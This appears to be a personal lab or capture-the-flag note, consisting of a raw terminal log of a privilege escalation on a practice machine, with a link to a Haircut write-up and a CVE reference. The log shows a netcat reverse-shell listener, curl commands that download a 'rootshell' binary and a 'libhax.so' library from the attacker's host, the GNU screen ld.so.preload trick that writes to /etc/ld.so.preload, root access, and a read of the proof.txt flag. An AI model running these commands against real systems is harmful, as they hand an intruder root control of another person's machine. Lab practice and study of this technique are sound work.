https://0xdf.gitlab.io/2020/09/10/htb-haircut.html#shell-as-root

CVE-2021-4041

└─$ rlwrap -cAr nc -lvnp 443

listening on \[any\] 443 ...

connect to \[192.168.45.186\] from (UNKNOWN) \[192.168.233.143\] 45632

/bin/sh: 0: can't access tty; job control turned off

$ dir

access.log  cdrom      etc   lib32   lost+found  opt   run   srv       tmp

bin         dev        home  lib64   media       proc  sbin  swap.img  usr

boot        error.log  lib   libx32  mnt         root  snap  sys       var

$ cd /tmp

$ curl http://192.168.45.186/rootshell -o /tmp/rootshell

% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current

Dload  Upload   Total   Spent    Left  Speed

100  741k  100  741k    0     0   386k      0  0:00:01  0:00:01 --:--:--  385k

$ ls

ft

netplan_tl0smn3h

rootshell

snap.lxd

systemd-private-e91565deb4834790b69df206284b7ddc-ModemManager.service-rEXVEh

systemd-private-e91565deb4834790b69df206284b7ddc-apache2.service-lZULUe

systemd-private-e91565deb4834790b69df206284b7ddc-fwupd.service-jYF4pj

systemd-private-e91565deb4834790b69df206284b7ddc-systemd-logind.service-fRkEgj

systemd-private-e91565deb4834790b69df206284b7ddc-systemd-resolved.service-j1k8Ri

systemd-private-e91565deb4834790b69df206284b7ddc-systemd-timesyncd.service-s2xZxi

systemd-private-e91565deb4834790b69df206284b7ddc-upower.service-aGdLci

vmware-root_798-2999657446

$ curl http://192.168.45.186/libhax.so -o /tmp/libhax.so

% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current

Dload  Upload   Total   Spent    Left  Speed

100 15528  100 15528    0     0  51588      0 --:--:-- --:--:-- --:--:-- 51588

$ cd /etc

$ umask 000

$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"

$ /tmp/rootshell

id

uid=0(root) gid=0(root) groups=0(root)

cd /root

ls

aerospike.sh

proof.txt

snap

cat proof.txt

260d6381612aa7e5b1680081972eabae

ipconfig

/bin/sh: 5: ipconfig: not found

ip a

1: lo: \<LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000

link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00

inet 127.0.0.1/8 scope host lo

valid_lft forever preferred_lft forever

3: ens160: \<BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000

link/ether 00:50:56:ab:a0:87 brd ff:ff:ff:ff:ff:ff

inet 192.168.233.143/24 brd 192.168.233.255 scope global ens160

valid_lft forever preferred_lft forever

![[Privilege Escaration image.png]]